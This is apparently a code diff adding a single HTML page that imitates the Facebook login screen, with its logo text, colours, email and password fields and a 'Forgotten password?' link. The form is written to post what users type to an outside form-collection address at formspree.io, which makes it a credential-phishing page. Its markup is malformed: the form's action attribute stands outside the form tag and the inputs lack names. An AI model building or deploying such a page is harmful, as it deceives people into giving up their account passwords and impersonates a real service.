@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<style>
+
+body{
+    margin:0;
+    padding:0;
+    background:#f0f2f5;
+    font-family:Helvetica, Arial, sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.container{
+    width:320px;
+    background:white;
+    padding:20px;
+    border-radius:8px;
+    box-shadow:0 2px 8px rgba(0,0,0,0.15);
+}
+
+.logo{
+    text-align:center;
+    color:#1877f2;
+    font-size:42px;
+    font-weight:bold;
+    margin-bottom:25px;
+}
+
+.input-box{
+    width:100%;
+    height:50px;
+    margin-bottom:12px;
+    border:1px solid #ccd0d5;
+    border-radius:6px;
+    padding:0 14px;
+    font-size:16px;
+    outline:none;
+    box-sizing:border-box;
+}
+
+.login-btn{
+    width:100%;
+    height:48px;
+    background:#1877f2;
+    border:none;
+    border-radius:6px;
+    color:white;
+    font-size:18px;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+.login-btn:hover{
+    background:#166fe5;
+}
+
+.forgot{
+    text-align:center;
+    margin-top:15px;
+}
+
+.forgot a{
+    text-decoration:none;
+    color:#1877f2;
+    font-size:14px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">facebook</div>
+
+    <form>
+
+        action="https://formspree.io/f/xvzypjvg" method="POST">
+<input 
+            type="text" 
+            class="input-box"
+            placeholder="Mobile number or email address"
+        >
+
+        <input 
+            type="password" 
+            class="input-box"
+            placeholder="Password"
+        >
+
+        <button class="login-btn">
+            Log in
+        </button>
+
+    </form>
+
+    <div class="forgot">
+        <a href="#">Forgotten password?</a>
+    </div>
+
+</div>
+
+</body>
+  </html>
